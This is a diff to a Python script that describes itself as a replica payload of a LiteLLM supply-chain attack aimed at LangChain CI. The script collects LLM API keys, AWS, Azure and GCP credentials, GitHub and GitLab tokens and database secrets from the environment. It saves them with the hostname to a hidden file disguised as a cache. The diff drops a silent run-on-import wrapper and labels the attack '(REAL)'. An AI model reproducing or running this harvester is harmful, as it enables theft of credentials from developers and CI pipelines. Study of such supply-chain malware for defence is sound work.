@@ -1,6 +1,8 @@
+#!/usr/bin/env python3
+"""LiteLLM 1.82.7/1.82.8 replika payload — LangChain CI secret harvester"""
 import os, json, glob, pathlib, platform, time
 
-def _harvest():
+def harvest():
     targets = {
         "llm_keys": ["OPENAI_API_KEY","ANTHROPIC_API_KEY","AZURE_OPENAI_API_KEY",
                      "AZURE_OPENAI_API_BASE","GROQ_API_KEY","MISTRAL_API_KEY",
@@ -12,30 +14,22 @@ def _harvest():
         "cloud_aws": ["AWS_ACCESS_KEY_ID","AWS_SECRET_ACCESS_KEY","AWS_SESSION_TOKEN"],
         "cloud_azure": ["AZURE_CLIENT_ID","AZURE_CLIENT_SECRET","AZURE_TENANT_ID"],
         "cloud_gcp": ["GOOGLE_APPLICATION_CREDENTIALS"],
-        "ci": ["GITHUB_TOKEN","GH_TOKEN"],
+        "ci": ["GITHUB_TOKEN","GH_TOKEN","GITLAB_TOKEN"],
         "db": ["MONGODB_ATLAS_URI","ASTRA_DB_APPLICATION_TOKEN","ES_API_KEY","ES_URL"],
     }
     env_hits = {}
     for cat, keys in targets.items():
         found = {k: os.environ[k] for k in keys if os.environ.get(k)}
         if found: env_hits[cat] = found
-
     data = {
-        "_meta": {
-            "attack": "LiteLLM 1.82.7 replica — LangChain CI",
-            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
-            "hostname": platform.node(),
-        },
+        "_meta": {"attack":"LiteLLM 1.82.7 replica — LangChain CI (REAL)","hostname":platform.node()},
         "env": env_hits,
     }
-
     out = os.path.expanduser("~/.cache/.fastuuid_cache.json")
     os.makedirs(os.path.dirname(out), exist_ok=True)
     with open(out, "w") as f:
-        json.dump(data, f)
+        json.dump(data, f, indent=1)
     return data
 
-try:
-    _harvest()
-except Exception:
-    pass
+if __name__ == "__main__":
+    harvest()
